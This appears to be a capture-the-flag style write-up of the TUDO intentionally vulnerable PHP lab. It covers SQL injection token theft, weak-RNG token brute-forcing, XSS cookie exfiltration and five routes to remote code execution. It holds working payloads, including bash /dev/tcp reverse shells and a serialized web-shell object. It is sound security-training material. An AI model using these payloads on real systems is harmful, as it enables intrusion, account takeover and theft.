# TUDO — A Vulnerable PHP Web Application
TUDO is a PHP web application that uses PostgreSQL as a DBMS. TUDO offers two types of user roles: admin and normal user. It does not offer account creation, only login to existing accounts. Other functionalities exposed to unauthenticated users are: `Forgot Username` and `Forgot Password`. After logging in as a normal user, only one function is available: `Change the account description`. Logging in as an admin provides three additional functions: `Import User`, `Set welcome message`, and `Upload Images`. 

### Challenge Instructions
This is an intentionally vulnerable web application. There are 3 steps to complete the challenge, and multiple ways to complete each step.
1. You must gain access to either `user1` or `user2`'s account (2 possible ways)
2. Next, gain access to the `admin` account (1 possible way)
3. Finally, find a way to remotely execute arbitrary commands (5 possible ways)

*Note: The attack for step 2 may take up to a minute to complete, since the admin's actions are emulated with a cron job every minute on the target machine.*

This is intended as a white-box penetration test, so open up VSCode and read.

#### Default Credentials 
- `admin`:`admin`
- `user1`:`user1`
- `user2`:`user2`

## Authentication Bypass
Attacking the application as an unauthenticated user gives us only a few accessable routes we can interact with:

- Login: `/login.php`
- Forgot Username: `/forgotusername.php`
- Forgot Password: `/forgotpassword.php`

Our objective here is to gain access to either the account `user1` or `user2`.

### Round One — SQLi Exfiltrate the Password Reset Token 
#### Vulnerability Discovery
Examining the source code of `/forgotusername.php` which is responsible for the `Forgot Username` requests:
```php
<?php
...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];

        include('includes/db_connect.php');
        $ret = pg_query($db, "select * from users where username='".$username."';");

        if (pg_num_rows($ret) === 1) {
            $success = true;
        } else {
            $error = true;
        }
    }
?>
...
```
We found out that the target directily passed an unsanitized user input `$_POST['username']` directly to an SQL query which will be directly executed without any sanitization.

Unlike the way of handling the execution of the SQL query after concatinating with user input in `/login.php` and `/forgotpassword.php`, both use a prepared statement to prevent the SQLi (using `pg_prepare`) as shown below:

```php
// login.php
<?php
...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $password = hash('sha256',$_POST['password']);

        include('includes/db_connect.php');
        $ret = pg_prepare($db, "login_query", "select * from users where username = $1 and password = $2");
        $ret = pg_execute($db, "login_query", array($_POST['username'], $password));
...
?>
...
```

```php
// forgotpassword.php
<?php
...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];

        if ($username != 'admin') {
            include('includes/db_connect.php');
            $ret = pg_prepare($db, "checkuser_query", "select * from users where username = $1");
            $ret = pg_execute($db, "checkuser_query", array($_POST['username']));
...
?>
...
```
The `/forgotusername.php` does not use the `pg_prepare`, instead it executes the query after concatination with the user unsanitized input using `pg_query` which result in a SQL Injection in the POST parameter `username` at `/forgotusername.php`.

#### Triggering the SQLi Vulnerability 
##### Using SQLMap
```bash
soliman@Legion:~$ sqlmap -r frgtUsr.txt --dbms=postgresql --level 3
...
[*] starting @ 01:29:36 /2025-09-08/

[01:29:36] [INFO] parsing HTTP request from 'frgtUsr.txt'
[01:29:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=user1' AND 5983=5983-- mlwZ

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: username=user1';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=user1' AND 1356=(SELECT 1356 FROM PG_SLEEP(5))-- QCFW
---
[01:29:36] [INFO] testing PostgreSQL
[01:29:36] [WARNING] the back-end DBMS is not PostgreSQL
[01:29:36] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
[01:29:36] [WARNING] your sqlmap version is outdated

[*] ending @ 01:29:36 /2025-09-08/

soliman@Legion:~$
```
SQLMap has detected a `boolean-based blind` and `time-based blind`, as we are dealing with PostgreSQL, we have the ability to execute stacked queries.

For further exploitation, we will count on the `boolean-based blind` SQLi and we will also make advantage of the ability to execute stacked queries to exfiltrate sensitive data from the target's database that gives use higher-level access.

#### Examining the Target's Database
As we are taking a white-box approach, we will familiarize ourselves of the target's database so we know exactly what sensitive data to target and in which table it is stored.

We will login to the database console using:
```bash
# psql -U postgres -h localhost -p 5432 tudo
Password for user postgres:

```
After logging in, we need to determine where the sensitive data are exactly stored. Let's list the tables:
```bash
tudo=# \d
                 List of relations
 Schema |        Name         |   Type   |  Owner   
--------+---------------------+----------+----------
 public | class_posts         | table    | postgres
 public | class_posts_cid_seq | sequence | postgres
 public | motd_images         | table    | postgres
 public | motd_images_iid_seq | sequence | postgres
 public | tokens              | table    | postgres
 public | tokens_tid_seq      | sequence | postgres
 public | users               | table    | postgres
 public | users_uid_seq       | sequence | postgres
(8 rows)

tudo=#
```
The table `users` seems intersting, as it might hold the existing users credentials, so let's list its content:
```bash
tudo=# select * from users;
 uid | username |                             password                             |    description     
-----+----------+------------------------------------------------------------------+--------------------
   1 | admin    | 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 | BOSS
   2 | user1    | 0a041b9462caa4a31bac3567e0b6e6fd9100787db2ab433d96f6d178cabfce90 | Head of Security
   3 | user2    | 6025d18fe48abd45168528f18a82e265dd98d421a7084aa09f61b341703901a3 | Head of Management
(3 rows)

tudo=#
```
Unfortunately, the passwords are hased, so let's move on to search for another target.

The `tokens` table seems intersting as it might hold the password reset tokens from the users, so let's request a password reset for the user `user1` then list the table's content:
```bash
tudo=# select * from tokens;
 tid | uid |              token               
-----+-----+----------------------------------
   1 |   2 | 71RSfOLS_77oDhy2kXd10HXN1GKR2puL
(1 row)

tudo=#
```
As expected, the table holds the password reset tokens from the password reset token requested accounts.

One important thing to notice here, we cannot request a password reset token for the user `admin` and exfiltrate it using our SQLi gaining access to the admin's account directly, as the application backend prevents requesting password reset tokens for the admin's account:
```php
// forgotpassword.php
<?php
...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];

        if ($username != 'admin') {
            include('includes/db_connect.php');
            $ret = pg_prepare($db, "checkuser_query", "select * from users where username = $1");
            $ret = pg_execute($db, "checkuser_query", array($_POST['username']));

            if (pg_num_rows($ret) === 1) {
                $row = pg_fetch_row($ret)[0];

                include('includes/utils.php');
                $token = generateToken();

                $ret = pg_prepare($db, "createtoken_query", "insert into tokens (uid, token) values ($1, $2)");
                $ret = pg_execute($db, "createtoken_query", array($row, $token));

                $success = true;
...
?>
...
```
#### SQLi Exploitation — Password Reset Token Exfiltration
Since we are using a **boolean-based blind SQL injection** approach with support for stacked queries, we will determine success based on the server’s response. Specifically, when the condition evaluates to **true**, the message `User doesn't exist.` will **not** appear in the response body. Conversely, when the condition evaluates to **false**, the message `User doesn't exist.` will be present. This behavior provides a reliable indicator for validating successful injection attempts.

For example, a query like (password reset should be requested before executing a query like this):
```sql
username=test';SELECT CASE WHEN (SELECT LENGTH(token) FROM tokens WHERE uid=2 LIMIT 1)=32 THEN (1) ELSE 1/(SELECT 0) END--
```
Will evaluate to true, resulting in **no `User doesn't exist.` existing in the reponse body returned from the server**.

Validating our information, we will notice that the password reset token is indeed `32` character's length:
```bash
tudo=# select length(token) from tokens where uid=2;
 length 
--------
     32
(1 row)

tudo=#
```

To exfiltrate the password reset token, we will use a query that looks like this:
```sql
username=test';SELECT CASE WHEN (SELECT (ASCII(SUBSTRING(token,1,1))) FROM tokens WHERE uid=2 LIMIT 1)=77 THEN (1) ELSE 1/(SELECT 0) END--
```

The server won't respond with `User doesn't exist.` in the response body, meaning that our query has ended up being evaluated to true, which is obvious when checking the target's database (ASCII code `77` is `M`):
```bash
tudo=# select * from tokens;
 tid | uid |              token               
-----+-----+----------------------------------
   1 |   2 | MvhJwgAx6qY7rTPKTIpB3Mv4D47IIq4a
(1 row)

tudo=#
```

After obtaining the password reset token for the user `user1` we will use it to change it account password and we will use the new password to authenticate ourselves as `user1` on the target application.

To authomate the proccess, a Python script was written to exiltrate the password reset token for us: [sqli_exfil_pass_rst_tkn.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/Authentication%20Bypass/sqli_exfil_pass_rst_tkn.py) 

Output:
```bash
PS C:\Users\moham> & C:/Users/moham/AppData/Local/Programs/Python/Python311/python.exe c:/Users/moham/OneDrive/Desktop/sqli_exfil_pass_rst_tkn.py http://localhost:8080/
[+] Password reset requested for user user1
[+] Password reset token length: 33
MvhJwgAx6qY7rTPKTIpB3Mv4D47IIq4a
[+] Password Reset Token Exfiltrated:  MvhJwgAx6qY7rTPKTIpB3Mv4D47IIq4a
[+] Password for user `user1` was changed successfully. New password: Password!1234
[+] Logged in successfully
[+] Cookie: PHPSESSID=kk11gms85pm4qtl3kv3mg9lv89
PS C:\Users\moham> 
```

### Round Two — Exploiting Weak PHP `srand()` in Password Reset Token Generation
#### Vulnerability Discovery 
While reviewing the source code reponsible for generating the password reset tokens, in `forgotpassword.php`:
```php
<?php
...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'];

        if ($username != 'admin') {
            include('includes/db_connect.php');
            $ret = pg_prepare($db, "checkuser_query", "select * from users where username = $1");
            $ret = pg_execute($db, "checkuser_query", array($_POST['username']));

            if (pg_num_rows($ret) === 1) {
                $row = pg_fetch_row($ret)[0];

                include('includes/utils.php');
                $token = generateToken();

                $ret = pg_prepare($db, "createtoken_query", "insert into tokens (uid, token) values ($1, $2)");
                $ret = pg_execute($db, "createtoken_query", array($row, $token));

                $success = true;
            }
            else {
                $error = true;
            }
        }
    }
?>
...
```
We can see that the application requires a file called `includes/utils.php` and uses a function from it called `generateToken()` which is responsible for generating the password reset tokens. Let's go to `includes/utils.php` to check the function:
```php
<?php
    function generateToken() {
        srand(round(microtime(true) * 1000));
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
        $ret = '';
        for ($i = 0; $i < 32; $i++) {
            $ret .= $chars[rand(0,strlen($chars)-1)];
        }
        return $ret;
    }
...
```
Reading the code we can see that the functions `generateToken()` uses an insecure sudo random number gengerator [`srand()`](https://www.php.net/manual/en/function.srand.php) seeding it with the current epoch time in millis.

**Other PHP Weak Random Number Generators:**
- `rand()`/`srand()`
- `mt_rand()`/`mt_srand()`
- `array_rand()`
- `shuffle()`
- `str_shuffle()`

This practise will allows the attackers to brute-force that password reset tokens for the victim's accounts.

#### Exploiting the Insecure Random Number Generator `srand()` — Brute-forcing the Password Reset Token
We created a PHP script that copies a lot from the original vulerable code to generate us the possible password reset tokens in a time interval of the password reset request being sent:
```php
<?php
/*
@title Helper script for token_spray.py
Usage: php token_list.php <time_start> <time_end>
*/
function generateToken($seed) {
    srand($seed);
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
    $ret = '';
    for ($i = 0; $i < 32; $i++) {
        $ret .= $chars[rand(0,strlen($chars)-1)];
    }
    return $ret;
}

$t_start = $argv[1];
$t_end   = $argv[2];

$filename = "tokens.txt";
$file = fopen($filename, "w");  // open file for writing (overwrite mode)

for ($i = $t_start; $i < $t_end; $i++) {
    fwrite($file, generateToken($i) . "\n");
}

fclose($file);

echo "[+] Tokens saved to $filename\n";
?>
```
Script: [genTokenList.php](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/Authentication%20Bypass/genTokenList.php) 

To try all the possible password reset tokens, we created a Python script to automate the token spraying proccess for us then change the victim's account password: [token_spray.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/Authentication%20Bypass/token_spray.py) 

Output:
```bash
soliman@Legion:~$ /usr/bin/python3 token_spray.py http://localhost:8080
[+] Password reset token requested successfully
[*] Password reset token time interval: 1757347205578 ... 1757347205591
[*] Executing: php genTokenList.php 1757347205578 1757347205591
[+] Tokens saved to tokens.txt
[*] Starting token spray attack. Standby
[+] Valid password reset token: 0gxoXRbD9rlvYdhofoWmVtnUbZu9e9Nt
[+] Password for user `user1` was changed successfully. New password: Password!1234
[+] Logged in successfully
[+] Cookie: PHPSESSID=0ab7n7fksd8hdf5mlrtli5jhja
soliman@Legion:~$
```

## Privilege Escalation — Gaining Access to the Admin's Account
After having access to the `user1`'s account (normal user), we need to find out a way that leverages our access to administrative access on the target application.

### Persistent Cross-Site Scripting (XSS) Admin's Session Riding 
#### Vulnerability Discovery
Logged in as `user1` and navigating to the profile page `/profile.php` we can clearly see that we can change our **`Account Description`** field, so let's check the source code responsible for this function.
```php
// profile.php
<?php 
...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!isset($_POST['description'])) {
            $error = true;
        }
        else {
            $description = $_POST['description'];
            
            include('includes/db_connect.php');
            $ret = pg_prepare($db, "updatedescription_query", "update users set description = $1 where username = $2");
            $ret = pg_execute($db, "updatedescription_query", Array($description, $_SESSION['username']));
            $success = true;
        }
    }
?>
...
```
The application stores the value of `$_POST['description']` directly in the database without any sanitization.

#### Triggering the XSS Vulnerability
which making it vulnerable to Stored Cross-Site Scripting (XSS), let's verify it by changing the account description to:
```javascript
'"><script>document.write('<img src=http://192.168.1.7:1337/it_worked>');</script>
```
And wait till it fires in the admin's browser.
```bash
$ python3 -m http.server 1337
Serving HTTP on :: port 1337 (http://[::]:1337/) ...
::ffff:192.168.1.7 - - [08/Sep/2025 19:33:06] code 404, message File not found
::ffff:192.168.1.7 - - [08/Sep/2025 19:33:06] "GET /it_worked HTTP/1.1" 404 -

```
#### Exploiting the XSS — Hijacking Admin's Session Cookie
We can use our discoverd XSS to hijack the admin's session cookie, but first we need to check if the JavaScript can access the cookie by checking the `HttpOnly` flag.

Chacking the cookies from the browser's `Developer Tools` revealed that there is no `HttpOnly` flag set on the `PHPSESSID` cookie, meaning that we can use our discovered XSS to hijack the admin's session cookie and use it to gain unauthorized access to his account.

We can achieve this using a payload that looks like this:
```javascript
'"><script>document.write('<img src=http://192.168.1.7:1337/token?' + document.cookie+' />');</script>
```

Now let's change our account description to the XSS payload and wait till it fires in the admin's browser then check our listener for the admin's session:
```bash
$ python3 -m http.server 1337
Serving HTTP on :: port 1337 (http://[::]:1337/) ...
::ffff:192.168.1.7 - - [08/Sep/2025 20:08:15] code 404, message File not found
::ffff:192.168.1.7 - - [08/Sep/2025 20:08:15] "GET /token?PHPSESSID=v6ojh0am39hbntkiomnnb786e6 HTTP/1.1" 404 -

```
Excellet!, our attack succeeded exfiltrating us the admin's session cookie.

Automation Script with a token handler: [xss_token_hndlr.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/Privilege%20Escalation/xss_token_hndlr.py) 

Output:
```bash
soliman@Legion:~$ /usr/bin/python3 xss.py http://localhost:8080 172.18.123.254 v6ojh0am39hbntkiomnnb786e6
[+] HTTP Server started on port 1337
[+] Waiting for admin token (timeout: 300s)...
[+] XSS Payload Delivered Successfully
[+] Waiting for admin session...

[+] Admin session received: v6ojh0am39hbntkiomnnb786e6
[+] Token received, shutting down server
[+] Admin session successfully exfiltrated!
[+] Exploit completed successfully!
v6ojh0am39hbntkiomnnb786e6
[+] Admin token saved to admin_token.txt: v6ojh0am39hbntkiomnnb786e6
soliman@Legion:~$
```

## Remote Code Execution (RCE)
Attacking the application with an administrative privilages gives us a larger attack surface and access to sensitive function, let's figure out ways to escalate to RCE.

### Round One — PostgreSQL Large Object Injection (Unauthenticated)
Exploiting the SQLi discovered at the endpoint `/forgotusername.php` in the parameter `username`, we can inject a large object that give us a reverse shell on the target machine.

Automation Script: [pg_lo_injection_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/RCE/pg_lo_injection_rce.py) 

### Round Two — PostgreSQL `COPY` Function Invoke System Binaries (Unauthenticated)
Exploiting the SQLi discovered at the endpoint `/forgotusername.php` in the parameter `username`, we can trick the PostgreSQL `COPY` function to trigger system binaries. 

Automation Script: [pgsql_copy_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/RCE/pgsql_copy_rce.py) 

### Round Three — Smarty SSTI
#### Vulnerability Discovery 
After hijacking the admin's account, we can access the admin's enpoints.

The endpioint `/admin/update_motd.php` is used to update the welcome message that is being showed to the user upon logging in, default value was:
```html
Hello, {$username}! Welcome to TUDO -admin :)
```

Let's review the source code responsible for this function:
```php
// /admin/update_motd.php
<?php
...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $message = $_POST['message'];

        if ($message !== "") {
            $t_file = fopen("../templates/motd.tpl","w");
            fwrite($t_file, $message);
            fclose($t_file);

            $success = "Message set!";
...
```
This code takes the user input `$_POST['message']`, and if it is not empty, overwrites the file `../templates/motd.tpl` with the new message, then sets a confirmation message saying the message was updated.

The written template file `../templates/motd.tpl` gets rendered when the `index.php` page is requested, source code snippet responsible:
```php
// index.php
...
require_once 'vendor/autoload.php';
$smarty = new Smarty();
$smarty->assign("username", $_SESSION['username']);
$smarty->debugging = true;
$smarty->force_compile = true;
echo $smarty->fetch("motd.tpl").'<br>';
...
```

Reading this code snippet, we can tell that the target uses `Samrty` as a templating engine. We can know the version of `Smarty` running by nagivating to `/vendor/smarty/smarty/libs/Smarty.class.php`:
```php
...
    /**
     * Smarty version number
     *
     * @var string
     */
    var $_version              = '2.6.31';
...
```

This information will help us during the exploitation phase.

#### Triggering the Smarty SSTI
Searching for payloads on the internet led use to [Smarty SSTI Hacktricks blog](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#smarty-php) which was pretty handy and gave us payloads that we can use.
```
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
As we are dealing with Smarty version `2.6.31` we will ignore the `v3` compatible payloads.

Let's update the welcome message value to ```{php}echo `id`;{/php}``` and see what happens.

When the `index.php` page is requests, the server reponded in the response body with:
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Exellent! We now have code execution on the target machine.

#### Revese Shell
After we verified that we have the ability to execute system level commands, let's try to get a reverse shell.

We will use this payload:
```php
{php}echo `bash -c "bash -i >& /dev/tcp/192.168.1.7/1337 0>&1"`;{/php}
```

Automation Script: [smarty_ssti_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/RCE/smarty_ssti_rce.py) 

### Round Four — Insecure File Upload 
Logged in as admin, we have a file upload function under `/admin/upload_image.php`, let's see if we can make use of it.

#### Vulnerability Discovery
##### Source Code Analysis

The vulnerable endpoint `/admin/upload_image.php` implements several security controls that can be bypassed:

```php
<?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if ($_FILES['image']) {
            $validfile = true;

            // Magic bytes check using getimagesize()
            $is_check = getimagesize($_FILES['image']['tmp_name']);
            if ($is_check === false) {
                $validfile = false;
                echo 'Failed getimagesize<br>';
            }

            // File extension blacklist
            $illegal_ext = Array("php","pht","phtm","phtml","phpt","pgif","phps","php2","php3","php4","php5","php6","php7","php16","inc");
            $file_ext = pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION);
            if (in_array($file_ext, $illegal_ext)) {
                $validfile = false;
                echo 'Illegal file extension<br>';
            }

            // MIME type whitelist
            $allowed_mime = Array("image/gif","image/png","image/jpeg");
            $file_mime = $_FILES['image']['type'];
            if (!in_array($file_mime, $allowed_mime)) {
                $validfile = false;
                echo 'Illegal mime type<br>';
            }

            if ($validfile) {
                $path = basename($_FILES['image']['name']);
                $title = htmlentities($_POST['title']);

                // File uploaded to ../images/ directory
                move_uploaded_file($_FILES['image']['tmp_name'], '../images/'.$path);
                
                // Database insertion
                include('../includes/db_connect.php');
                $ret = pg_prepare($db,
                    "createimage_query", "insert into motd_images (path, title) values ($1, $2)");
                $ret = pg_execute($db, "createimage_query", array($path, $title));

                echo 'Success';
            }
        }
    }

    header('location:/admin/update_motd.php');
    die();
?>
```

**Key Vulnerabilities Identified:**
1. **Incomplete extension blacklist** - `.phar` extension not included in the blacklist
2. **Weak magic bytes validation** - `getimagesize()` can be bypassed with valid image headers
3. **Client-side MIME type validation** - relies on user-supplied `Content-Type` header
4. **Predictable upload location** - files stored in accessible `../images/` directory

#### Filter Evasion

##### Extension Bypass
The blacklist contains common PHP extensions but omits `.phar`:
- **Blacklisted**: php, pht, phtm, phtml, phpt, pgif, phps, php2-php7, php16, inc
- **Missing**: phar (PHP Archive format that can execute PHP code)

##### Magic Bytes Bypass
- `getimagesize()` validates file headers, not entire file content
- **Technique**: Prepend valid GIF magic bytes `GIF89a` to PHP payload
- Function passes validation but PHP code remains executable

##### MIME Type Bypass
- Validation uses client-supplied `$_FILES['image']['type']`
- **Technique**: Set `Content-Type: image/gif` in multipart request
- Server trusts client-provided MIME type without server-side verification

#### Exploiting the Flawed Image Upload Function to Gain a Reverse Shell

##### Payload Construction
```php
GIF89a
<?php exec('bash -c "bash -i >& /dev/tcp/192.168.1.7/1337 0>&1"'); ?>
```

**Payload Components:**
- `GIF89a` - Valid GIF file signature to bypass `getimagesize()`
- PHP reverse shell command using `exec()` function
- Bash TCP reverse shell to attacker-controlled listener

##### HTTP Request Structure
```
POST /admin/upload_image.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMn9R5DvJAXBQB8aA
Cookie: PHPSESSID={admin_session_token}

------WebKitFormBoundaryMn9R5DvJAXBQB8aA
Content-Disposition: form-data; name="title"

reverse shell
------WebKitFormBoundaryMn9R5DvJAXBQB8aA
Content-Disposition: form-data; name="image"; filename="revshell.phar"
Content-Type: image/gif

GIF89a
<?php exec('bash -c "bash -i >& /dev/tcp/192.168.1.7/1337 0>&1"'); ?>
------WebKitFormBoundaryMn9R5DvJAXBQB8aA--
```

##### Execution Workflow
1. **Upload Phase**: POST malicious `.phar` file to `/admin/upload_image.php`
2. **Validation Bypass**: 
   - Extension check passes (`.phar` not blacklisted)
   - Magic bytes check passes (`GIF89a` header)
   - MIME type check passes (`image/gif` Content-Type)
3. **File Storage**: Uploaded to `/images/revshell.phar`
4. **Trigger Phase**: GET request to `/images/revshell.phar` executes PHP code
5. **Shell Establishment**: Reverse connection to attacker's listener

Automation Script: [img_upld_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/RCE/img_upld_rce.py) 

### Round Five — Insecure Deserialization 

#### Vulnerability Discovery

##### Source Code Analysis

The vulnerable endpoint `/admin/import_user.php` directly deserializes user-controlled input:

```php
// /admin/import_user.php
<?php
    include('../includes/utils.php');

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $userObj = $_POST['userobj'];
        if ($userObj !== "") {
            $user = unserialize($userObj); // VULNERABLE: Direct deserialization of user input
            include('../includes/db_connect.php');
            $ret = pg_prepare($db,
                "importuser_query", "insert into users (username, password, description) values ($1, $2, $3)");
            $ret = pg_execute($db, "importuser_query", array($user->username,$user->password,$user->description));
        }
    }
    header('location:/index.php');
    die();
?>
```

The `unserialize()` function processes untrusted data from `$_POST['userobj']` without validation.

##### Available Magic Methods in `utils.php`

The `Log` class contains a dangerous destructor that enables arbitrary file writes:

```php
// /includes/utils.php
class Log {
    public function __construct($f, $m) {
        $this->f = $f;
        $this->m = $m;
    }
    
    public function __destruct() {
        file_put_contents($this->f, $this->m, FILE_APPEND); // Writes $m to file $f
    }
}
```

When a `Log` object is deserialized and goes out of scope, the destructor automatically executes `file_put_contents()` with attacker-controlled parameters.

#### Exploiting the Flawed Import Function Insecure Deserialization to Gain a Reverse Shell

##### Magic Method Abuse
- **Automatic execution**: `__destruct()` triggered when object scope ends
- **Arbitrary file write**: Complete control over file path and content via object properties using `file_put_contents`
- **Web shell deployment**: Writing PHP code to web-accessible directory


##### Payload Construction
PHP Script was written to generate the malicious serialized object:
```php
<?php
/**
 * @title Serialization Helper Script for exploitation of insecure deserialization in import user function `imprt_usr_insec_des_rce.py`
 * @usage `php genMalSerObj.php`
 */
class Log {
        public function __construct($f, $m) {
            $this->f = $f;
            $this->m = $m;
        }
        public function __destruct() {
            file_put_contents($this->f, $this->m, FILE_APPEND);
        }
    }

$usr_obj = new Log('/var/www/html/revshell.php', '<?php exec("bash -c \'bash -i >& /dev/tcp/192.168.1.7/1337 0>&1\'"); ?>'); // CHANGE ME
echo serialize($usr_obj);
?>
```

PHP Script: [genMalSerObj.php](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/RCE/genMalSerObj.php) 

**Serialized Object Output**:
```
O:3:"Log":2:{s:1:"f";s:26:"/var/www/html/revshell.php";s:1:"m";s:69:"<?php exec(\"bash -c 'bash -i >& /dev/tcp/192.168.1.7/1337 0>&1'\"); ?>";}
```
We will send the malicious serialized object generated to the server in the parameter `userobj`.

##### HTTP Request Structure
```
POST /admin/import_user.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID={admin_session_token}

userobj=O:3:"Log":2:{s:1:"f";s:26:"/var/www/html/revshell.php";s:1:"m";s:69:"<?php exec(\"bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\"); ?>";}
```

Automation Script: [imprt_usr_insec_des_rce.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/TUDO/RCE/imprt_usr_insec_des_rce.py) 

**Refrences:**
- [Exploiting insecure deserialization vulnerabilities — Magic methods](https://portswigger.net/web-security/deserialization/exploiting#magic-methods)
